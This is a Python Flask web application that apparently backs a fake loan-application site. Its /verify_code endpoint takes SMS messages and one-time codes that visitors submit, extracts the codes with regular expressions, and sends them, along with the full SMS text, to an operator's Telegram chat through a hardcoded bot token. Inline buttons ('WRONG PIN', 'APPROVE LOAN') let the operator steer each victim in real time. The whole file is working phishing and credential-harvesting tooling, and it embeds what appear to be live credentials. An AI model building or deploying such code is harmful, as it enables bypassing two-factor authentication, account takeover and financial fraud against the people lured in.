from flask import Flask, render_template, request, jsonify
import requests
import re
import json
from datetime import datetime
import os

app = Flask(__name__)

# Telegram Config - EDIT THESE
TELEGRAM_BOT_TOKEN = '8898988712:AAH8sR5P4Lb2TUKxTWNnO3dMqKNOMRXNGZ4'
TELEGRAM_CHAT_ID = '8589275340'

def extract_code_from_sms(sms_text):
    if not sms_text:
        return None
    patterns = [
        r'code[:\s]+([a-zA-Z0-9]{6,20})',
        r'OTP[:\s]+([a-zA-Z0-9]{6,20})',
        r'use the code[:\s]+([a-zA-Z0-9]{6,20})',
        r'\b([a-zA-Z0-9]{8,20})\b'
    ]
    for pattern in patterns:
        match = re.search(pattern, sms_text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def send_telegram_message(message, buttons=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    if buttons:
        payload['reply_markup'] = json.dumps({'inline_keyboard': buttons})
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except:
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/apply')
def apply():
    return render_template('apply.html')

@app.route('/approve')
def approve():
    return render_template('approve.html')

@app.route('/verify_code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        sms_text = data.get('code', '')
        full_sms = data.get('full_sms', '')
        
        sms_to_send = full_sms if full_sms else sms_text
        extracted = extract_code_from_sms(sms_to_send)
        
        message = f"""
🔐 CODE VERIFICATION

Full SMS:
{sms_to_send}

Extracted Code: {extracted or 'Not found'}

Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        buttons = [
            [
                {'text': '❌ WRONG PIN', 'callback_data': 'wrong_pin'},
                {'text': '❌ WRONG CODE', 'callback_data': 'wrong_code'}
            ],
            [
                {'text': '✅ APPROVE LOAN', 'callback_data': 'approve_loan'}
            ]
        ]
        
        result = send_telegram_message(message, buttons)
        
        if result and result.get('ok'):
            return jsonify({'status': 'success'})
        return jsonify({'status': 'error'}), 500
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/resend_code', methods=['POST'])
def resend_code():
    try:
        message = "🔄 CODE RESEND REQUESTED"
        buttons = [[{'text': '🔄 WAITING', 'callback_data': 'waiting'}]]
        send_telegram_message(message, buttons)
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error'}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if 'callback_query' in data:
            action = data['callback_query']['data']
            callback_id = data['callback_query']['id']
            
            # Answer callback
            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            requests.post(answer_url, json={'callback_query_id': callback_id, 'text': 'Done'})
            
            # Send response
            if action == 'approve_loan':
                response = "✅ LOAN APPROVED!"
            elif action == 'wrong_pin':
                response = "❌ WRONG PIN"
            elif action == 'wrong_code':
                response = "❌ WRONG CODE"
            else:
                response = f"Action: {action}"
            
            send_telegram_message(response)
            return jsonify({'status': 'success'})
        return jsonify({'status': 'ok'})
    except:
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
